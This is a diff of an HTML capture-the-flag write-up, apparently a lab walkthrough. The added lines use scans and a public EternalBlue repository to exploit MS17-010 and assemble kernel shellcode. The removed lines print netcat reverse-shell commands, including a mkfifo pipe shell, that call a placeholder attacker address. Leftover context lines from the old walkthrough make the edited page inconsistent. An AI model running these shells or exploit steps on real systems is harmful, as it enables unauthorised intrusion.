@@ -53,40 +53,22 @@
                 <pre><code>case@local:~$ nmap -n -v -sS -oX blue_output.xml 10.10.34.160</code></pre>
                 <p>Here is a truncated snapshot of our scan output.</p>
                 <img src="blue_output.png" alt="not_found.png">
-                <p>There is some useful stuff here. 445 (SMB) is definitely going to be our attack point, the room is called "Blue" and the preceeding learning modules have been almost exclusively referring to the EternalBlue exploit (MS17-010). Let us confirm our suspicions and run the nmap "vuln" scripts against port 445.</p>
+                <p>There is some useful stuff here. 445 (SMB) is definitely going to be our attack point, the room is called "Blue" and the preceeding learning modules have been almost exclusively referring to the EternalBlue exploit. Let us confirm our suspicions and run the nmap "vuln" scripts against port 445.</p>
                 <pre><code>case@local:~$ nmap -n -v --script=vuln -p 445 -oX blue_script_vulns.xml 10.10.34.160</code></pre>
                 <p>Here is a truncated snapshot of our scan output.</p>
                 <img src="blue_script_vulns.png" alt="not_found.png">
+                <p>Our suspicions have been confirmed, this machine is indeed vulnerable to "Remote Code Execution vulnerability in Mircosoft SMBv1 servers (ms17-010)". We have the CVE ID also. A quick search in exploit-db shows a number of available exploits.</p>
+                <img src="ms17_exploits.png" alt="not_found.png">
+                <p>Anyway, as mentioned in the intro, most write-ups for this room, follow the exact same patterns, so I thought I have a "look-about" on the Web, see what I could find. I came across this GitHub repo: https://github.com/3ndG4me/AutoBlue-MS17-010. The README states "This version of the exploit {EternalBlue} is prepared in a way where you can exploit eternal blue WITHOUT Metasploit". This is exactly what I want to do. </p>
             </section>
-
-            <section id="Three">
-                <h2>Step Three - A Reverse Shell</h2>
-                <p>We now have an active session on the site. Not only that, but we have been greeted with a ruddy web form with an input that is labelled as "Command Panel". Will this form execute shell commands for us? Let us try, enter "whoami" and hit enter...</p>
-                <img src="pickle_form.png" alt="not_found.png">
-                <p>We effectively have a web shell. "whoami" is showing we are currently logged in as "www-data". This is good. However, "www-data" is commonly the user created when the web server software is installed and therefore is, typically, a low-privileged user created specifically for running web server processes. I wonder if we can submit the form with a command to open a network connection and execute a shell? Let us try with netcat. First we need a listener on our local/attacking machine.. </p>
-                <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
-                <p>Now submit the command..</p>
-                <pre><code>nc attacking_ip_address 444 -e /bin/bash</code></pre>
-                <p>It did not work....</p>
-                <img src="sad_morty.jpeg" alt="not_found.png">
-                <p>Maybe it just does not like the attempt to execute the shell; in many systems, especially on newer versions of netcat (like netcat-openbsd), the -e option (which allows execution of commands) is disabled by default due to security concerns, as it can be used for malicious purposes (like reverse shells!!). So let us see if we can simply submit the command...</p>
-                <pre><code>nc attacking_ip_address 444</code></pre>
-                <p>It worked!!</p>
-                <pre><code>case@local:~$ sudo nc -lvnp 444
-[sudo] password for case:
-Listening on 0.0.0.0 444
-Connection received on 10.10.236.162 37146
-                </code></pre>
-                <p>Okay, so we can successfully execute a netcat command but we cannot use the "-e" option, which allows us to execute an external program after making the connection. Well, let's just do it manually instead, by creating a named pipe and redirecting stdin, stdout and stderr...</p>
-                <pre><code>mkfifo /tmp/f; nc attacking_ip_address 444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f</code></pre>
-                <p>We now have a reverse shell..</p>
-                <pre><code>case@local:~$ sudo nc -lvnp 444
-[sudo] password for case:
-Listening on 0.0.0.0 444
-Connection received on 10.10.236.162 37260
-whoami
-www-data
-                </code></pre>
+            
+            <section id="Two">
+                <h2>Step Two - Gain Access</h2>
+                <p>I now know the machine is vulnerable to CVE-2017-0143. I have also found an interesting GitHub repo that includes some relevant, EternalBlue, exploit code. The repo actually contains the following file "eternalblue_kshellcode_x64.asm". This is an x64 assembly file, containing 64-bit kernel shellcode (kernel shellcode is a type of shellcode that runs with kernel-level (ring 0) privileges, i.e. full access to system hardware, memory etc). The repo even comes with shell scripts for assembling the entire exploit, reverse shell included. However, this is a learning process, so let us do some of this manually.</p>
+                <p>A quick look at the script "shell_prep.sh" we can quickly see how this is achieved. The shell runs the following command.</p>
+                <pre><code>nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin</code></pre>
+                <p>This command invokes the Netwide Assembler (NASM) to assemble the shellcode to a raw binary (bin) file, i.e. direct translate into machine code, no headers or metadata. Run this command directly to create your payload file "sc_x64_kernel.bin"</p>
+                
                 <p>This is a bit clunky however, it doesn't give us a fully-fledged terminal environment. Let us see if we can spawn a pseudo-terminal using Python, to more accurately simulate a real terminal session; we know we are on a Linux box, Python3 is likely installed, let us give it a go...</p>
                 <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
                 <p>It worked a treat...</p>
